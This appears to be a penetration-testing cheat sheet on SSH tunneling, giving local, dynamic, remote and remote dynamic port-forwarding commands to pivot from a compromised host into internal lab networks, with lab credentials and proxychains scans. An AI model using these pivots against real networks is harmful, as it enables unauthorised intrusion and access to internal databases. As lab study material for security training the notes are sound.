# SSH Tunneling

## Local Port Forwarding

Syntax: `[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT`
- Listening socket is on the SSH **client**
- Packets are forwarded by the SSH **server**

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
Then access from Kali:
```bash
smbclient -L \\\\<compromised-host>\\ -p 4455 -U hr_admin --password="Welcome1234"
```

---

## Dynamic Port Forwarding (SOCKS Proxy)

Creates a SOCKS proxy — forwards to any destination the SSH server can reach.

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

**Configure proxychains (`/etc/proxychains4.conf`):**
```
[ProxyList]
socks5 192.168.50.63 9999
```

**Usage:**
```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
```

> Lower `tcp_read_time_out` and `tcp_connect_time_out` in proxychains config to speed up port scans.

---

## Remote Port Forwarding

Listening port is bound to the **SSH server** (Kali). Useful when firewalls block inbound but allow outbound SSH.

```bash
# Run on compromised host — connects back to Kali and binds port there
ssh -R 127.0.0.1:1234:10.4.119.215:5432 parallels@192.168.45.176 -N
```

**Requirements:**
- Enable password authentication in Kali's `/etc/sshd_config`
- Start SSH on Kali: `sudo systemctl start ssh`

Access from Kali:
```bash
psql -h 127.0.0.1 -p 1234 -d hr_payroll -U postgres
```

---

## Remote Dynamic Port Forwarding

SOCKS proxy port is bound to the SSH server (Kali); traffic is forwarded by the SSH client (compromised host).

```bash
# Run on compromised host
ssh -N -R 9998 parallels@<kali-ip>
```

**Configure proxychains on Kali:**
```
socks5 127.0.0.1 9998
```

```bash
sudo proxychains4 nmap -sT -vv -p9050-9100 10.4.119.215 -Pn -n
```
